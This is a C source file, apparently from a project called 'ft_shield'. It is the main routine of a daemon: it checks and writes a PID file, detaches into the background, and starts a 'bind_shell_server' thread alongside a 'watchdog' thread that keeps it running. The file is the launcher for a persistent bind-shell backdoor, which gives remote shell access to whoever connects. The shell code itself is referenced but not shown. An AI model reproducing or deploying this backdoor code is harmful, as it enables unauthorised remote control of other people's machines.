#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>

#include "ft_shield.h"
#include "threads.h"
#include "logger.h"

static void create_pid_file()
{
    FILE *pid_file = fopen(PID_FILE, "w");

    if (pid_file == NULL)
    {
        log_to_file("Failed to create PID file");
        exit(EXIT_FAILURE);
    }

    fprintf(pid_file, "%d", getpid());
    fclose(pid_file);

    log_to_file("PID: %d", getpid());
}

static void verify_pid_running()
{
    int pid;
    FILE *pid_file = fopen(PID_FILE, "r");

    if (pid_file == NULL)
    {
        log_to_file("No PID file found");
        return;
    }

    if (fscanf(pid_file, "%d", &pid) != 1)
    {
        log_to_file("Failed to read PID file or invalid PID format");
        fclose(pid_file);
        return;
    }

    fclose(pid_file);

    if (kill(pid, 0) == 0)
    {
        log_to_file("PID %d is running. Exiting...", pid);
        exit(EXIT_SUCCESS);
    }
    else if (kill(pid, 0) == -1)
    {
        log_to_file("PID %d not running or invalid PID. Continuing...", pid);
        // Remove PID file
        remove(PID_FILE);
        return;
    }
    else
    {
        log_to_file("Unexpected error while checking PID %d", pid);
        return;
    }
}

void run_daemon()
{
    verify_pid_running();
    daemonize();
    create_pid_file();

    shared_control_t control = {
        .keep_running = ATOMIC_VAR_INIT(1),
        .pause_server = ATOMIC_VAR_INIT(0),
        .exit_status = ATOMIC_VAR_INIT(0)};

    pthread_create(&control.server_thread, NULL, bind_shell_server, &control);
    pthread_create(&control.monitor_thread, NULL, watchdog, &control);

    while (atomic_load(&control.keep_running))
        sleep(5);

    log_to_file("Exiting daemon...");
    pthread_cancel(control.monitor_thread);
    pthread_cancel(control.server_thread);
    pthread_join(control.monitor_thread, NULL);
    pthread_join(control.server_thread, NULL);

    exit(control.exit_status);
}
